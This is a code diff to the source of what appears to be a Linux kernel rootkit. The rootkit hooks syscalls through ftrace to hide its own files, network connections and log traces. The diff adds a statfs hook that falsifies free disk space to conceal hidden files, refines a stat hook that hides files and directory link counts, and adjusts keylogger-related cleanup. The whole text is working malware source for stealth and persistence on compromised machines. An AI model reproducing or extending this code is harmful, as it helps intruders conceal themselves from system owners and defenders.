@@ -15,6 +15,7 @@
 #include <linux/inet_diag.h>
 #include <linux/netlink.h>
 #include <linux/syslog.h>
+#include <linux/statfs.h>
 
 #include "lkm.h"
 #include "fs.h"
@@ -33,6 +34,7 @@ sys64 real_m_read;
 sys64 real_m_bpf;
 sys64 real_m_recvmsg;
 sys64 real_m_lseek;
+sys64 real_m_statfs;
 
 #define PT_REGS_PARM1(x) ((x)->di)
 #define PT_REGS_PARM2(x) ((const char *const *)(x)->si)
@@ -166,24 +168,12 @@ static bool is_sys_parent(unsigned int fd)
 	struct dentry *parent_dentry;
 	char *path_buffer, *parent_path;
 	bool rv = false;
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 12, 0)
-	struct file *fdfile;
-#endif
 
 	struct fd f = fdget(fd);
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 12, 0)
-	if (!fd_file(f))
-#else
 	if (!f.file)
-#endif
 		goto out;
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 12, 0)
-	fdfile = fd_file(f);
-	dentry = fdfile->f_path.dentry;
-#else
 	dentry = f.file->f_path.dentry;
-#endif
 	parent_dentry = dentry->d_parent;
 
 	path_buffer = (char *)__get_free_page(GFP_KERNEL);
@@ -192,11 +182,7 @@ static bool is_sys_parent(unsigned int fd)
 		goto out;
 	}
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 12, 0)
-	parent_path = d_path(&fdfile->f_path, path_buffer, PAGE_SIZE);
-#else
 	parent_path = d_path(&f.file->f_path, path_buffer, PAGE_SIZE);
-#endif
 	if (!IS_ERR(parent_path)) {
 		if (!strncmp(parent_path, "/proc", 5) ||
 		    !strncmp(parent_path, "/sys", 4) ||
@@ -298,8 +284,7 @@ static asmlinkage long m_read(struct pt_regs *regs)
 
 	arg = (const char __user *)PT_REGS_PARM2(regs);
 	if (!copy_from_user((void *)buf, (void *)arg, size)) {
-		int dest = ((strstr(buf, MODNAME) || strstr(buf, "kovid") ||
-			     strstr(buf, "journald")));
+		int dest = ((strstr(buf, MODNAME) || strstr(buf, "journald")));
 		if (!dest)
 			goto leave;
 
@@ -631,6 +616,32 @@ resume:
 
 leave:
 	return -ENOENT;
+}
+
+static asmlinkage long m_statfs(struct pt_regs *regs)
+{
+	struct statfs buf = { 0 };
+	struct statfs __user *ubuf =
+		(struct statfs __user *)PT_REGS_PARM2(regs);
+	loff_t size;
+
+	long rv = real_m_statfs(regs);
+
+	if (copy_from_user(&buf, ubuf, sizeof(struct statfs)))
+		return rv;
+
+	size = fs_total_size_by_type(buf.f_type);
+	if (buf.f_blocks > 1) {
+		long used_blocks = (size + buf.f_bsize - 1) / buf.f_bsize;
+
+		buf.f_bfree += used_blocks;
+		buf.f_bavail += used_blocks; // Also reduce available space
+	}
+
+	// Send modified data back to user-space
+	(void)!copy_to_user((void *)ubuf, &buf, sizeof(struct statfs));
+
+	return rv;
 }
 
 struct tcpudpdata {
@@ -994,8 +1005,7 @@ static int m_proc_dointvec(struct ctl_table *table, int write, void *buffer,
 }
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(5, 11, 0)
-// Recursion test is enabled by default before Linux 5.11
-#define FTRACE_OPS_FL_RECURSION 0
+#define FTRACE_OPS_FL_RECURSION FTRACE_OPS_FL_RECURSION_SAFE
 #endif
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(5, 11, 0)
@@ -1022,13 +1032,26 @@ static long m_vfs_statx(int dfd, struct filename *filename, int flags,
 {
 #endif
 #if LINUX_VERSION_CODE < KERNEL_VERSION(5, 18, 0)
-	char *target = kzalloc(__MAXLEN, GFP_KERNEL);
+	char *target = NULL;
 #else
-	const char *target = filename ? filename->name : "";
+	const char *target = NULL;
 #endif
 
 	// call original first, I want stat
 	long rv = real_vfs_statx(dfd, filename, flags, stat, request_mask);
+
+	// filename can be -EINVAL
+	// return immediately if it is
+	if (IS_ERR(filename)) {
+		prwarn("Invalid filename=%p rv=%ld\n", filename, rv);
+		return rv;
+	}
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 18, 0)
+	target = kzalloc(__MAXLEN, GFP_KERNEL);
+#else
+	target = filename->name;
+#endif
 
 	//  Return not found to userspace if target is present (file,dir),
 	//  otherwise count the number of hidden hard-links
@@ -1049,8 +1072,9 @@ static long m_vfs_statx(int dfd, struct filename *filename, int flags,
 		if (S_ISDIR(stat->mode)) {
 			int count = fs_is_dir_inode_hidden(stat->ino);
 			if (count > 0) {
-				prinfo("%s: file match ino=%llu nlink=%d count=%d\n",
-				       __func__, stat->ino, stat->nlink, count);
+				prinfo("%s: directory match ino=%llu nlink=%d size=%llu count=%d\n",
+				       __func__, stat->ino, stat->nlink,
+				       stat->size, count);
 				stat->nlink -= count;
 			}
 		}
@@ -1222,6 +1246,7 @@ static struct ftrace_hook ft_hooks[] = {
 	{ _sys_arch("sys_bpf"), m_bpf, &real_m_bpf, true },
 	{ _sys_arch("sys_recvmsg"), m_recvmsg, &real_m_recvmsg, true },
 	{ _sys_arch("sys_lseek"), m_lseek, &real_m_lseek, true },
+	{ _sys_arch("sys_statfs"), m_statfs, &real_m_statfs, true },
 	{ "tcp4_seq_show", m_tcp4_seq_show, &real_m_tcp4_seq_show },
 	{ "udp4_seq_show", m_udp4_seq_show, &real_m_udp4_seq_show },
 	{ "tcp6_seq_show", m_tcp6_seq_show, &real_m_tcp6_seq_show },
@@ -1380,8 +1405,8 @@ bool sys_init(void)
 		}
 
 		// init fist a couple of hidden files
-		fs_add_name_ro(tty, 0);
-		fs_add_name_ro(ssl, 0);
+		fs_add_name_ro(tty, NULL, NULL);
+		fs_add_name_ro(ssl, NULL, NULL);
 
 		rc = !_fh_install_hooks(ft_hooks);
 		if (rc) {
@@ -1406,6 +1431,7 @@ void sys_deinit(void)
 	struct sys_addr_list *sl, *sl_safe;
 
 	_fh_remove_hooks(ft_hooks);
+
 	fs_file_rm(sys_get_sslfile());
 	_keylog_cleanup();
 
@@ -1413,4 +1439,5 @@ void sys_deinit(void)
 		list_del(&sl->list);
 		kfree(sl);
 	}
+	synchronize_rcu();
 }
